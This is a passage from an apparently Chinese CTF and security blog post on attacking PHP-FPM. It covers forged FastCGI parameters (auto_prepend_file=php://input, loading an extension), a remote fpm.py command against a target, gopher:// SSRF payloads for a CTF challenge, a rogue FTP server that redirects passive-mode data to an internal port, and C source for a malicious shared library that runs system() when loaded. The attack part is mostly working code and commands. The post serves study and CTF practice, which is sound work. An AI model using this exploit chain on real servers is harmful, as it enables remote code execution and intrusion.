'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': &amp;quot;localhost&amp;quot;,
'SERVER_PROTOCOL': 'HTTP/1.1'
}
&lt;/code>&lt;/pre>&lt;p>其中&lt;code>SCRIPT_FILENAME&lt;/code>就是php-fpm会去执行的文件，由于5.3.9版本引入了&lt;code>security.limit_extensions&lt;/code>的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过&lt;code>find / -name &amp;quot;*.php&amp;quot;&lt;/code>来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置&lt;code>FASTCGI_PARAMS&lt;/code>来动态修改php的设置，可以利用这两项&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_VALUE': 'auto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'allow_url_include = On'
&lt;/code>&lt;/pre>&lt;p>来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写）&lt;/p>
&lt;h2 id="攻击思路例题">攻击思路&amp;amp;&amp;amp;例题&lt;/h2>
&lt;p>伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去&lt;/p>
&lt;h3 id="远程攻击php-fpm">远程攻击php-fpm&lt;/h3>
&lt;p>这里是&lt;a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">p牛的脚本&lt;/a>，兼容py2&amp;amp;3，默认-p 9000，-c &lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python fpm.py target_ip /var/www/html/index.php -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们需要改动的只有params部分的&lt;code>PHP_ADMIN_VALUE&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>'PHP_ADMIN_VALUE': 'allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so',
&lt;/code>&lt;/pre>&lt;p>成功&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png" alt="image-20211112175028236">&lt;/p>
&lt;p>需要注意的是，如果只是加载恶意.so而不执行代码，则并不需要有已存在php文件的绝对路径，用&lt;code>_&lt;/code>占位即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python fpm.py target_ip _ -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php echo `id`;exit;?&amp;gt;&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png" alt="image-20211112175353957">&lt;/p>
&lt;h3 id="ssrf攻击本地php-fpm">SSRF攻击本地php-fpm&lt;/h3>
&lt;p>利用&lt;code>gopher://&lt;/code>协议可以直接传输TCP协议流，我们构造好payload之后就可以传入进行ssrf攻击了&lt;/p>
&lt;p>构造payload依旧使用p牛的脚本，不过做一点微小的改动；这部分可以参见后面结合ftp攻击fpm的内容，总之就照这几步走&lt;/p>
&lt;ul>
&lt;li>p牛脚本生成urlencode之后的tcp数据流&lt;/li>
&lt;li>加gopher://127.0.0.1:9000前缀&lt;/li>
&lt;li>梭！?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx&lt;/li>
&lt;/ul>
&lt;h4 id="强网青少-2021ssrf">[强网青少 2021]SSRF&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75715e">//like fpm?
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_HEADER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;crawldata&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$crl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用p牛脚本生成payload，直接ssrf伪协议好像也行？没环境，云一下了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gopher://127.0.0.1:9001/_xxxxxxxx&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;dict://127.0.0.1:80/info&amp;#34;;
&lt;/span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;file:///proc/net/arp&amp;#34;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将序列化之后的结果传入crawldata&lt;/p>
&lt;h3 id="结合ftppasv-mode攻击本地php-fpm">结合ftp&amp;amp;PASV mode攻击本地php-fpm&lt;/h3>
&lt;h4 id="ftp使用pasv模式转发ftp-data">ftp使用PASV模式转发ftp-data&lt;/h4>
&lt;p>先简单测试ftp连接进行抓包&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png" alt="image-20211112195819783">&lt;/p>
&lt;p>其中的&lt;code>227 Entering Passive Mode (192,168,187,3,230,20)&lt;/code>的括号内的内容表示的是传输的FTP-DATA打向的位置，前一部分是ip，端口是230*256+20=58900&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png" alt="image-20211112200459682">&lt;/p>
&lt;p>可以看到我们文件内容是150ok之后才被传出去的，而且会被放在FTP-DATA中被上传和下载&lt;/p>
&lt;p>我们可以模拟一个ftp-server，在响应PASV命令（即passive 切换被动模式）时返回&lt;code>(127,0,0,1,0,12345)&lt;/code>来让FTP-DATA打向内网12345端口；这是一个恶意ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 192.168.187.1&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;215 UNIX Type: L8&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>在另一台192.168.187.3上访问这个恶意服务，期间传输的文件就会被转发到192.168.187.3自己的12345端口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png" alt="image-20211112233757565">&lt;/p>
&lt;h4 id="php加载恶意so文件">php加载恶意.so文件&lt;/h4>
&lt;p>修改php.ini /etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#00a8c8">[PHP]&lt;/span>
&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">/home/amelia/TEMP/fpm/wuhu.so&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>C源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;touch /home/amelia/TEMP/fpm/pwned&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译为.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行php即触发恶意.so&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png" alt="image-20211112162658685">&lt;/p>
&lt;h4 id="令php使用ftp">令php使用ftp://&lt;/h4>
&lt;p>/etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-ini" data-lang="ini">&lt;span style="color:#75af00">allow_url_fopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">On&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ftp读 注意后面的路径都需要绝对路径&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php ftp_read.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/flag.txt&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png" alt="image-20211112215002622">&lt;/p>
&lt;p>ftp写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$agrv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">ftp_write&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;hello, world&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png" alt="image-20211112223440182">&lt;/p>
&lt;p>但是这里一直是可以新建文件但是写入不了，读入的参数2一直是int(0)，暂时还没解决问题（不过用下面那个写入很正常……&lt;/p>
&lt;p>覆盖已存在文件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_context_create&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ftp&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;overwrite&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)));&lt;/span>
